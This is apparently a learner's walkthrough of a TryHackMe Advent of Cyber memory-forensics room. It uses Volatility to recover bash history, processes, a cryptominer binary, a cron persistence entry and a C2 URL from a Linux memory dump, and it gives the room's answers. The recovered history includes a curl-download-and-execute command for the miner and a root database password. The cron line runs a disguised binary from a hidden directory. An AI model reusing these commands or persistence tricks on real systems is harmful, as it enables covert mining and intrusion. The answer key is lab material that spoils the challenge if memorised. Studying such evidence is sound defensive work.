
# Task 25  [Day 19] Memory forensics CrypTOYminers Sing Volala-lala-latility


## Learning Objectives

- ﻿Understand what memory forensics is and how to use it in a digital forensics investigation
- Understand what volatile data and memory dumps are
- Learn about Volatility and how it can be used to analyse a memory dump  
    
- Learn about Volatility profiles

### What Is Memory Forensics

Memory forensics, also known as volatile memory analysis or random access memory (RAM) forensics, is a branch of digital forensics. It involves the examination and analysis of a computer's volatile memory (RAM) to uncover digital evidence and artefacts related to computer security incidents, cybercrimes, and other forensic investigations. This differs from hard disk forensics, where all files on the disk can be recovered and then studied. Memory forensics focuses on the programs that were running when the memory dump was created. This type of data is volatile because it will be deleted when the computer is turned off.

### What Is Volatile Data

In computer forensics, volatile data refers to information that is temporarily stored in a computer's memory (RAM) and can be easily lost or altered when the computer is powered off or restarted. Volatile data is crucial for digital investigators because it provides a snapshot of the computer's state at the time of an incident. Any incident responder should be aware of what volatile data is. The reason is that when looking into a device that has been compromised, an initial reaction might be to turn off the device to contain the threat.

Some examples of volatile data are running processes, network connections, and RAM contents. Volatile data is not written to disk and is constantly changing in memory. The issue here is that any malware will be running in memory, meaning that any network connections and running processes that spawned from the malware will be lost. Powering down the device means valuable evidence will be destroyed.

### What Is a Memory Dump  

A memory dump is a snapshot of memory that has been captured to perform memory analysis. It will contain data relating to running processes captured when the memory dump was created.

### Benefits of Memory Forensics

Memory forensics offers valuable benefits in digital investigations by capturing real-time data from a computer's volatile memory. It provides rapid insight into ongoing activities, detects stealthy threats, captures volatile data like passwords, and allows investigators to understand user actions and system states during incidents - all without altering the target system. In other words, memory forensics helps confirm malicious actors' activities by analysing a computer system's volatile memory to uncover evidence of unauthorised or malicious actions. It provides crucial insights into the attacker's tactics, techniques, and potential indicators of compromise (IOC).

Another thing to keep in mind is that capturing a hard disk image of a device can be time-consuming. Then, you have to consider the problem of transferring the image, which could be hundreds of gigabytes in size – and that's before you even consider how long the analysis will take the incident response (IR) team. This is where memory analysis can really help the IR team; capturing a memory dump from any device will be much faster and smaller. Suppose we prioritise RAM over a hard disk image. In that case, the IR team can already start analysing the memory dump for IOCs while beginning the process of capturing an image of the hard drive.

### What Are Processes

A process is an independent, self-contained unit of execution within an operating system that consists of its own program code, data, memory space, and system resources. Imagine your computer as a busy chef in a kitchen. The chef can cook multiple dishes simultaneously, but to keep things organised, they use separate cooking stations for different tasks. Each cooking station has its own ingredients, pots, and pans. These cooking stations represent what we call "processes" in a computer. This is crucial in memory forensics because knowing the processes that were running during the capture of the memory dump will tell us what programs were also running at that time.

We can categorise processes into two distinct groups:

|   |   |   |
|---|---|---|
|**Category**|**Description**|**Example**|
|User Process|These are processes a user has started. They typically involve applications and software users interact with directly.|Firefox: This is a web browser that we can use to surf the web.|
|Background Process|These are processes that operate without direct user interaction. They often perform tasks that are essential for the system's operation or for providing services to user processes.|Automated backups: Backup software often runs in the background, periodically backing up data to ensure its safety and recoverability.|

### Volatility

Volatility is a command-line tool that lets digital forensics and incident response teams analyse a memory dump in order to perform memory analysis. Volatility is written in Python, and it can analyse snapshots taken from Linux, Mac OS, and Windows. Volatility has a wide range of use cases, including the following:  

- Listing any active and closed network connections
- Listing a device's running processes at the time of capture
- Listing possible command line history values
- Extracting possible malicious processes for further analysis
- And the list keeps on going

### Volatility Profiles

Profiles are crucial for correctly interpreting the memory dump from a target system. A profile in Volatility defines the operating system's architecture, version, and various memory specific to the target system. Using the appropriate profile is crucial because different operating systems and versions have different memory layouts and data structures. Volatility comes with many profiles for the Windows operating system, and we can verify this using `vol.py --info`.


- Go to the evidence

```
ubuntu@volatility:~$ cd Desktop/Evidence/
ubuntu@volatility:~/Desktop/Evidence$ ls -la
total 2098012
drwxr-xr-x 2 ubuntu ubuntu       4096 Oct 30 19:19 .
drwxr-xr-x 3 ubuntu ubuntu       4096 Oct 30 19:18 ..
-rw-r--r-- 1 ubuntu ubuntu    1330595 Oct 30 19:19 Ubuntu_5.4.0-163-generic_profile.zip
-r--r--r-- 1 ubuntu ubuntu 2147019840 Oct 30 19:17 linux.mem
ubuntu@volatility:~/Desktop/Evidence$ 

```

- copy already profile ubuntu
```
buntu@volatility:~/Desktop/Evidence$ cp Ubuntu_5.4.0-163-generic_profile.zip ~/.local/lib/python2.7/site-packages/volatility/plugins/overlays/linux/
ubuntu@volatility:~/Desktop/Evidence$ 


buntu@volatility:~/Desktop/Evidence$ vol.py --info | grep Ubuntu
Volatility Foundation Volatility Framework 2.6.1
LinuxUbuntu_5_4_0-163-generic_profilex64 - A Profile for Linux Ubuntu_5.4.0-163-generic_profile x64
```

## Memory Analysis

The file **linux.mem** contains the memory dump of the Linux server we're going to analyse. This file is located in our home directory. For Volatility to begin the analysis, we have to specify the file with the `-f` flag and the profile with the `--profile` flag. We can use the `-h` flag to look at all the different **plugins** we can use to help with our analysis.

- **History File**

```
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_bash
Volatility Foundation Volatility Framework 2.6.1
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    8092 bash                 2023-10-02 18:13:46 UTC+0000   sudo su
    8092 bash                 2023-10-02 18:15:44 UTC+0000   git clone https://github.com/504ensicsLabs/LiME && cd LiME/src/
    8092 bash                 2023-10-02 18:15:53 UTC+0000   ls
    8092 bash                 2023-10-02 18:15:55 UTC+0000   make
    8092 bash                 2023-10-02 18:16:16 UTC+0000   vi ~/.bash_history 
    8092 bash                 2023-10-02 18:16:38 UTC+0000    
    8092 bash                 2023-10-02 18:16:38 UTC+0000   ls -la /home/elfie/
    8092 bash                 2023-10-02 18:16:42 UTC+0000   sudo su
    8092 bash                 2023-10-02 18:18:38 UTC+0000   ls -la /home/elfie/
    8092 bash                 2023-10-02 18:18:41 UTC+0000   vi ~/.bash_history 
   10205 bash                 2023-10-02 18:19:58 UTC+0000   mysql -u root -p'NEhX4VSrN7sV'
   10205 bash                 2023-10-02 18:19:58 UTC+0000   id
   10205 bash                 2023-10-02 18:19:58 UTC+0000   curl http://10.0.2.64/toy_miner -o miner
   10205 bash                 2023-10-02 18:19:58 UTC+0000   ./miner
   10205 bash                 2023-10-02 18:19:58 UTC+0000   cat /home/elfie/.bash_history
   10205 bash                 2023-10-02 18:20:03 UTC+0000   vi .bash_history 
   10205 bash                 2023-10-02 18:21:21 UTC+0000   cd LiME/src/

```

- **Running Processes**

```
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_pslist
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             PPid            Uid             Gid    DTB                Start Time
------------------ -------------------- --------------- --------------- --------------- ------ ------------------ ----------
0xffff9ce9bd5baf00 systemd              1               0               0               0      0x000000007c3ae000 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5bc680 kthreadd             2               0               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5b9780 rcu_gp               3               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5b8000 rcu_par_gp           4               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d4680 kworker/0:0H         6               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d0000 mm_percpu_wq         8               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d5e00 ksoftirqd/0          9               2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d2f00 rcu_sched            10              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d9780 migration/0          11              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5d8000 idle_inject/0        12              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5dde00 kworker/0:1          13              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5daf00 cpuhp/0              14              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd5dc680 kdevtmpfs            15              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd632f00 netns                16              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd634680 rcu_tasks_kthre      17              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd631780 kauditd              18              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd630000 khungtaskd           19              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd635e00 oom_reaper           20              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6eaf00 writeback            21              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6ec680 kcompactd0           22              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6e9780 ksmd                 23              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6e8000 khugepaged           24              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd73af00 kintegrityd          70              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd74de00 kblockd              71              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd74af00 blkcg_punt_bio       72              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd74c680 tpm_dev_wq           73              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd749780 ata_sff              74              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd748000 md                   75              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd73de00 edac-poller          76              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd738000 devfreq_wq           77              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd739780 watchdogd            78              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd73c680 kworker/u2:1         79              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f8000 kswapd0              81              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f9780 ecryptfs-kthrea      82              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6faf00 kthrotld             84              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f1780 acpi_thermal_pm      85              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f4680 scsi_eh_0            86              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f2f00 scsi_tmf_0           87              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f5e00 scsi_eh_1            88              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6f0000 scsi_tmf_1           89              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6fde00 vfio-irqfd-clea      91              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd6ede00 kworker/u2:3         92              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd71de00 ipv6_addrconf        93              2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd70c680 kstrp                102             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd705e00 kworker/u3:0         105             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bbf9af00 charger_manager      118             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bbf9c680 kworker/0:1H         119             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bbf90000 scsi_eh_2            159             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd719780 scsi_tmf_2           161             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bd71af00 cryptd               162             2               0               0      ------------------ 2023-10-02 18:08:02 UTC+0000
0xffff9ce9bbb35e00 irq/18-vmwgfx        187             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
0xffff9ce9bbf9de00 ttm_swap             189             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
0xffff9ce9bbadde00 kdmflush             211             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
0xffff9ce9bd708000 raid5wq              237             2               0               0      ------------------ 2023-10-02 18:08:03 UTC+0000
0xffff9ce9bbf91780 jbd2/dm-0-8          284             2               0               0      ------------------ 2023-10-02 18:08:04 UTC+0000
0xffff9ce9bbad9780 ext4-rsv-conver      285             2               0               0      ------------------ 2023-10-02 18:08:04 UTC+0000
0xffff9ce971889780 systemd-journal      355             1               0               0      0x0000000072d08000 2023-10-02 18:08:04 UTC+0000
0xffff9ce9bbf98000 systemd-udevd        387             1               0               0      0x0000000071040000 2023-10-02 18:08:04 UTC+0000
0xffff9ce9bbad8000 iprt-VBoxWQueue      404             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bbadc680 kaluad               508             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce97188af00 kmpath_rdacd         509             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce97188de00 kmpathd              510             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce97188c680 kmpath_handlerd      511             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bbf92f00 multipathd           512             1               0               0      0x000000006fc32000 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bd702f00 loop0                523             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bd700000 loop1                527             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9b9338000 jbd2/sda2-8          529             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9b933de00 ext4-rsv-conver      530             2               0               0      ------------------ 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bd709780 systemd-timesyn      556             1               102             104    0x000000007adb8000 2023-10-02 18:08:05 UTC+0000
0xffff9ce9bd701780 systemd-network      763             1               100             102    0x0000000070650000 2023-10-02 18:08:07 UTC+0000
0xffff9ce9bd70af00 systemd-resolve      766             1               101             103    0x0000000070438000 2023-10-02 18:08:07 UTC+0000
0xffff9ce9bd70de00 accounts-daemon      801             1               0               0      0x000000006f0dc000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9bbc11780 cron                 805             1               0               0      0x0000000070456000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b933c680 dbus-daemon          809             1               103             106    0x0000000072498000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9aef21780 networkd-dispat      821             1               0               0      0x0000000079288000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b92a2f00 polkitd              823             1               0               0      0x00000000792e8000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b92a0000 rsyslogd             828             1               104             110    0x0000000076344000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b92a5e00 snapd                829             1               0               0      0x0000000074f3e000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9aef25e00 systemd-logind       830             1               0               0      0x000000007c310000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b5639780 udisksd              832             1               0               0      0x00000000756ca000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b5638000 atd                  833             1               0               0      0x00000000756d8000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b4feaf00 ModemManager         881             1               0               0      0x00000000763e2000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b4fec680 unattended-upgr      899             1               0               0      0x0000000073a3e000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b4fe8000 agetty               901             1               0               0      0x0000000073040000 2023-10-02 18:08:10 UTC+0000
0xffff9ce9b0ad1780 sshd                 1400            1               0               0      0x00000000705a4000 2023-10-02 18:08:17 UTC+0000
0xffff9ce9b2f51780 kworker/0:5          1942            2               0               0      ------------------ 2023-10-02 18:10:08 UTC+0000
0xffff9ce9b32e0000 sshd                 7989            1400            0               0      0x0000000073eb4000 2023-10-02 18:13:49 UTC+0000
0xffff9ce9b58eaf00 systemd              8009            1               1000            1000   0x0000000031b06000 2023-10-02 18:13:59 UTC+0000
0xffff9ce9b2f50000 (sd-pam)             8010            8009            1000            1000   0x000000006d016000 2023-10-02 18:13:59 UTC+0000
0xffff9ce9b3bb8000 sshd                 8091            7989            1000            1000   0x0000000070a28000 2023-10-02 18:13:59 UTC+0000
0xffff9ce9b3bbaf00 bash                 8092            8091            1000            1000   0x000000007ac4a000 2023-10-02 18:13:59 UTC+0000
0xffff9ce9b1f42f00 mysqld               8839            1               114             118    0x0000000073394000 2023-10-02 18:14:34 UTC+0000
0xffff9ce9b1a4c680 kworker/u2:0         10094           2               0               0      ------------------ 2023-10-02 18:19:42 UTC+0000
0xffff9ce9b1a4de00 kworker/0:0          10110           2               0               0      ------------------ 2023-10-02 18:19:42 UTC+0000
0xffff9ce9b32e1780 sshd                 10111           1400            0               0      0x000000007ada6000 2023-10-02 18:20:05 UTC+0000
0xffff9ce9b3f78000 sshd                 10204           10111           1000            1000   0x000000007060a000 2023-10-02 18:20:13 UTC+0000
0xffff9ce9b3f79780 bash                 10205           10204           1000            1000   0x000000006eee8000 2023-10-02 18:20:13 UTC+0000
0xffff9ce9aee75e00 sudo                 10276           10205           0               0      0x00000000733e8000 2023-10-02 18:22:35 UTC+0000
0xffff9ce9ad112f00 systemd-udevd        10277           387             0               0      0x00000000711be000 2023-10-02 18:22:35 UTC+0000
0xffff9ce9aee70000 insmod               10278           10276           0               0      0x0000000073056000 2023-10-02 18:22:36 UTC+0000
0xffff9ce9ad115e00 systemd-udevd        10279           387             0               0      0x000000007ba64000 2023-10-02 18:22:36 UTC+0000
0xffff9ce9b1e4c680 miner                10280           1               1000            1000   0x0000000074fa2000 2023-10-02 18:22:37 UTC+0000
0xffff9ce9bc23af00 mysqlserver          10291           1               1000            1000   0x000000006f166000 2023-10-02 18:22:37 UTC+0000
```

- **Process Extraction**

```
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p 10280
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             Address            Output File
------------------ -------------------- --------------- ------------------ -----------
0xffff9ce9b1e4c680 miner                10280           0x0000000000400000 extracted/miner.10280.0x400000

vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p 10291
Volatility Foundation Volatility Framework 2.6.1
Offset             Name                 Pid             Address            Output File
------------------ -------------------- --------------- ------------------ -----------
0xffff9ce9bc23af00 mysqlserver          10291           0x0000000000400000 extracted/mysqlserver.10291.0x400000

ls extracted/
miner.10280.0x400000  mysqlserver.10291.0x400000

```

- File Extraction

```
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_enumerate_files | grep -i cron 
Volatility Foundation Volatility Framework 2.6.1
0xffff9ce9bc312e80                       684 /home/crond.reboot
0xffff9ce9bb88f6f0                       682 /home/crond.pid
0xffff9ce9bb88cbb0                       679 /home/systemd/units/invocation:cron.service
0xffff9ce9baa31a98                    138255 /var/spool/cron
0xffff9ce9baa72bb8                    138259 /var/spool/cron/crontabs
0xffff9ce9b78280e8                    132687 /var/spool/cron/crontabs/elfie
0xffff9ce9baa54568                    138257 /var/spool/cron/atjobs
0xffff9ce9baa31650                     13246 /usr/sbin/cron
0xffff9ce9b7829ee0                       582 /usr/bin/crontab
               0x0 ------------------------- /usr/lib/systemd/system/cron.service.d
0xffff9ce9bc47d688                     10065 /usr/lib/systemd/system/cron.service
0xffff9ce9baa749b0                    524316 /etc/cron.hourly
0xffff9ce9baa73000                    525591 /etc/pam.d/cron
0xffff9ce9baa73cd8                    524314 /etc/cron.d
0xffff9ce9baa75f18                    525419 /etc/cron.d/e2scrub_all
0xffff9ce9baa74568                    525420 /etc/cron.d/popularity-contest
0xffff9ce9baa70978                    524970 /etc/crontab
0xffff9ce9bc47dad0                    525496 /etc/init.d/cron
0xffff9ce9baa35240                    525444 /etc/default/cron
               0x0 ------------------------- /etc/systemd/system/cron.service.d
               0x0 ------------------------- /etc/systemd/system/cron.service
0xffff9ce9bc4fd240                    525090 /etc/systemd/system/multi-user.target.wants/cron.service

```

```
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_find_file -i 0xffff9ce9b78280e8 -O extracted/elfie 
Volatility Foundation Volatility Framework 2.6.1
```

```
cat extracted/elfie 
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (- installed on Mon Oct  2 18:22:12 2023)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
*/8 * * * * /var/tmp/.system-python3.8-Updates/mysqlserver

```


## Answer the questions below

What is the exposed password that we find from the bash history output?

NEhX4VSrN7sV

What is the PID of the miner process that we find?  

10280

What is the MD5 hash of the miner process?  

```
 md5sum extracted/miner.10280.0x400000 
153a5c8efe4aa3be240e5dc645480dee  extracted/miner.10280.0x400000

```

What is the MD5 hash of the mysqlserver process?  

```
md5sum extracted/mysqlserver.10291.0x400000 
c586e774bb2aa17819d7faae18dad7d1  extracted/mysqlserver.10291.0x400000

```

Use the command `strings extracted/miner.<PID from question 2>.0x400000 | grep http://`. What is the suspicious URL? (Fully defang the URL using CyberChef)  

```
strings extracted/miner.10280.0x400000 | grep http://
"cpu":""idle":"nice":"user":	types 	value=abortedaccept4alt -> answersany -> charsetchunkedcmdlineconnectcpuinfocpuprofcs     derivedenvironexpiresfloat32float64forcegcfs     fstatatgatewaygctracegetconfgs     head = http://invalidlookup modulesnil keynop -> panic: r10    r11    r12    r13    r14    r15    r8     r9     rax    rbp    rbx    rcx    rdi    rdx    refererrefreshrflags rip    rsi    rsp    runningserial:signal stoppedsyscalltraileruintptrunknownupgradevboxdrvwaiting data=%q etypes  goal
1111 using unaddressable value1455191522836685180664062572759576141834259033203125: day-of-year out of rangeECDSA verification failureGODEBUG: can not disable "HTTP Version Not SupportedSIGSTOP: stop, unblockableaddress type not supportedasn1: invalid UTF-8 stringbad certificate hash valuebase 128 integer too largebidirule: failed Bidi Rulecall from unknown functioncannot marshal DNS messagechacha20: counter overflowchacha20: wrong nonce sizecorrupted semaphore ticketcriterion lacks equal signcryptobyte: internal errorduplicate pseudo-header %qencountered a cycle via %sentersyscall inconsistent forEachP: P did not run fnfreedefer with d.fn != nilhttp2: Framer %p: wrote %vid (%v) <= evictCount (%v)initSpan: unaligned lengthinvalid port %q after hostinvalid request descriptormalformed HTTP status codemalformed chunked encodingname not unique on networknet/http: request canceledno CSI structure availableno message of desired typenon sequence tagged as setnonvoluntary_ctxt_switchesnotewakeup - double wakeupout of memory (stackalloc)persistentalloc: size == 0read from empty dataBufferreadLoopPeekFailLocked: %vreflect.Value.CanInterfacereflect.Value.OverflowUintrequired key not availableruntime: bad span s.state=runtime: pipe failed with segment prefix is reservedshrinking stack in libcallstartlockedm: locked to mestopped after 10 redirectstoo many colons in addresstruncated base 128 integerunclosed criterion bracket is not assignable to type !#$%&()*+-./:<=>?@[]^_{|}~ .*keywords" CONTENT="(.*)">363797880709171295166015625Common 32-bit KVM processorCurveP256CurveP384CurveP521DATA frame with stream ID 0G waiting list is corruptedSIGILL: illegal instructionSIGXCPU: cpu limit exceededaccess-control-allow-originaddress not a stack addressafter object key:value pairarchive/tar: write too longcan't create process %s: %schannel number out of rangecipher: incorrect length IVcommunication error on sendcryptobyte: length overflowcurrent time %s is after %sgcstopm: not waiting for gcgrowslice: cap out of rangehkdf: entropy limit reachedhttp chunk length too largehttp2: response body closedhttp://mcgreedysecretc2.thminsufficient security levelinternal lockOSThread errorinvalid HTTP header name %qinvalid dependent stream IDinvalid profile bucket typekey was rejected by servicemakechan: size out of rangemakeslice: cap out of rangemakeslice: len out of rangemspan.sweep: bad span statenet/http: invalid method %qnet/http: use last responsenot a XENIX named type fileos: process not initializedos: unsupported signal typeprogToPointerMask: overflowrunlock of unlocked rwmutexruntime: asyncPreemptStack=runtime: checkdead: find g runtime: checkdead: nmidle=runtime: corrupted polldescruntime: netpollinit failedruntime: thread ID overflowruntime

```

```
hxxp[://]mcgreedysecretc2[.]thm
```

After reading the elfie file, what location is the mysqlserver process dropped in on the file system?

```
*/8 * * * * /var/tmp/.system-python3.8-Updates/mysqlserver
```





I completed # Task 25  [Day 19] Memory forensics CrypTOYminers Sing Volala-lala-latility!, Don't miss out Tryhackme #AdventOfCyber @RealTryHackMe https://tryhackme.com/room/adventofcyber2023